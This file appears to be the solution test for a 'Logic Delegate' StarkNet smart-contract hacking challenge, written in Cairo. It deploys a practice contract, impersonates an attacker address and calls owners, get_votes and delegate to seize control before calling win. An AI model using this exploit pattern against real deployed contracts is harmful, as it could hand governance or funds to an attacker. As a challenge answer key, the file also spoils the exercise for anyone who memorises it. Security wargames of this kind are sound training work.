%lang starknet

from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.starknet.common.syscalls import get_caller_address

from src.logic_delegate.interfaces.ILogicDelegate import ILogicDelegate

// * -------------------------------------------------------------------------- * //
// *                               Initialization                               * //
// * -------------------------------------------------------------------------- * //

@view
func __setup__{syscall_ptr: felt*, range_check_ptr}() {
    alloc_locals;

    local LOGIC_DELEGATE: felt;

    %{
        context.LOGIC_DELEGATE = deploy_contract("src/logic_delegate/LogicDelegate.cairo").contract_address
        ids.LOGIC_DELEGATE = context.LOGIC_DELEGATE
    %}

    return ();
}

// * -------------------------------------------------------------------------- * //
// *                                   Hacking                                  * //
// * -------------------------------------------------------------------------- * //

@external
func test_hack{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    alloc_locals;

    local LOGIC_DELEGATE: felt;
    local attacker = 'starknet-attacker';

    %{ ids.LOGIC_DELEGATE = context.LOGIC_DELEGATE %}

    // * ---------------------------- Your code here... --------------------------- * //

    %{ start_prank(ids.attacker, target_contract_address=ids.LOGIC_DELEGATE) %}

    ILogicDelegate.owners(LOGIC_DELEGATE, attacker);
    ILogicDelegate.get_votes(LOGIC_DELEGATE, 9);
    ILogicDelegate.delegate(LOGIC_DELEGATE, attacker);

    // * -------------------------------- Checking -------------------------------- * //

    ILogicDelegate.win(LOGIC_DELEGATE);

    %{ print("Logic Delegate: Challenge Completed! ✨") %}

    return ();
}
